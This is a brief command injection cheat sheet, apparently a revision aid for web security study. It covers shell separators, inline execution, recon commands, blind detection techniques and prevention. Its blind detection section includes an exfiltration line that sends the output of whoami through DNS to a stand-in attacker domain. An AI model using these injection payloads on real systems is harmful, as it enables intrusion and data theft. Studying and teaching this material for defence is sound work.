# Command Injection Cheat Sheet

## Common Command Separators

### Windows & Unix

```text
&
&&
|
||
```

### Unix Only

```text
;
Newline (\n)
```

---

## Inline Execution (Unix)

```text
`command`
```

```text
$(command)
```

---

# Useful Linux Commands

Current User

```bash
whoami
```

Operating System

```bash
uname -a
```

Network Configuration

```bash
ifconfig
```

Network Connections

```bash
netstat -an
```

Running Processes

```bash
ps -ef
```

---

# Useful Windows Commands

Current User

```cmd
whoami
```

Operating System

```cmd
ver
```

Network Configuration

```cmd
ipconfig /all
```

Network Connections

```cmd
netstat -an
```

Running Processes

```cmd
tasklist
```

---

# Blind Detection Techniques

✔ Time Delay

```text
ping -c 10 127.0.0.1
```

✔ Output Redirection

```text
whoami > output.txt
```

✔ OAST

```text
nslookup attacker-domain
```

✔ OAST Data Exfiltration

```text
nslookup `whoami`.attacker-domain
```

---

# Detection Order

1. Visible Output (`echo`)
2. Time Delay
3. Output Redirection
4. OAST
5. Data Exfiltration

---

# Prevention

- Avoid OS commands.
- Use platform APIs.
- Apply strict input validation.
- Use allowlists.
- Validate numeric input.
- Reject unexpected characters.
- Do not rely on escaping shell metacharacters.

---

# One-Minute Revision

**OS Command Injection** allows attackers to execute operating system commands by injecting input into shell commands.

Detection methods include:

- Visible command output
- Time delays
- Output redirection
- Burp Collaborator (OAST)

Effective prevention relies on avoiding shell commands where possible and validating all user input using strict allowlists.